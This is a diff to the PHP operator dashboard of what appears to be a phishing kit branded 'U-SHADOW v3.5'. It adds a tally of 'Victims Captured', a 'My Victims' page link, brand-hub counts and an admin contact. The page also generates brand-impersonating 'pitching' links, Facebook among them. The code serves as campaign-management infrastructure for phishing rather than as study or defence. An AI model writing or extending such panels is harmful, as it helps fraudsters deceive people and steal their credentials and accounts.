@@ -6,6 +6,13 @@ if (!isset($_SESSION['user'])) {
 }
 $user = $_SESSION['user'];
 
+// User specific stats
+$analytics_data = json_decode(file_get_contents(ANALYTICS_FILE), true);
+$user_analytics = array_filter($analytics_data, function($v) use ($user) {
+    return ($v['user_id'] ?? '') === $user['username'];
+});
+$clicks_count = count($user_analytics);
+
 $categories_raw = json_decode(file_get_contents(CATEGORIES_FILE), true);
 $categories = [];
 foreach ($categories_raw as $cat) {
@@ -42,6 +49,7 @@ foreach ($categories_raw as $cat) {
     <nav class="navbar-old">
         <ul>
             <li><a href="dashboard.php"><i class="fas fa-home"></i> Home</a></li>
+            <li><a href="victims.php"><i class="fas fa-skull"></i> My Victims</a></li>
             <li><a href="signup.php" style="display: none;"><i class="fas fa-user-plus"></i> Sign Up</a></li>
             <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
             <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
@@ -54,8 +62,16 @@ foreach ($categories_raw as $cat) {
         <div class="breadcrumb-old">.: Dashboard :.</div>
         <div class="welcome-msg">
             Welcome back, <strong><?php echo s($user['username']); ?></strong>!<br>
-            Select a brand below to generate your unique pitching link.
+            Manage your pitching links and track your victims here.
         </div>
+
+        <section class="panel-old">
+            <div class="panel-header-old">My Statistics</div>
+            <div class="panel-body-old">
+                <p>Victims Captured: <strong><?php echo $clicks_count; ?></strong></p>
+                <p>Available Brand Hubs: <strong><?php echo count($categories_raw); ?></strong></p>
+            </div>
+        </section>
 
         <section class="panel-old">
             <div class="panel-header-old">Generate Links</div>
@@ -110,6 +126,7 @@ foreach ($categories_raw as $cat) {
     </main>
 
     <footer class="footer-old">
+        Contact Admin: <a href="mailto:<?php echo s(ADMIN_EMAIL); ?>" style="color: #c0392b; font-weight: 700;"><?php echo s(ADMIN_EMAIL); ?></a><br>
         Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
         <strong>U-SHADOW v3.5 &copy;</strong>
     </footer>
